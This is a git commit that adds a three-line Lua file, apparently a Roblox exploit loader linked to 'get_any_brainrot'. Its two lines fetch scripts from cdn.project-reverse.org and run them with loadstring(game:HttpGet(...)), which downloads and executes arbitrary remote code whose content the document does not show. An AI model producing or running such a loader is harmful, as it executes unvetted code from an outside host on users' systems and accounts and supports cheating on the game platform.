945874c2b5dc74fbc1dcae342c92fde21d538bc5
xlolo30127 <lolo30127aaaa@outlook.fr>
2026-05-08 10:25:57 -0700

    Add script_bprptDIX_1778261156004.lua

---
+++ script_bprptDIX_1778261156004.lua
@@ -0,0 +1,3 @@
+ID="82628313-d109-4e2f-bafc-2cfc48842953";
+RUN_AFTER=loadstring(game:HttpGet("https://cdn.project-reverse.org/get_any_brainrot.luau"));
+loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
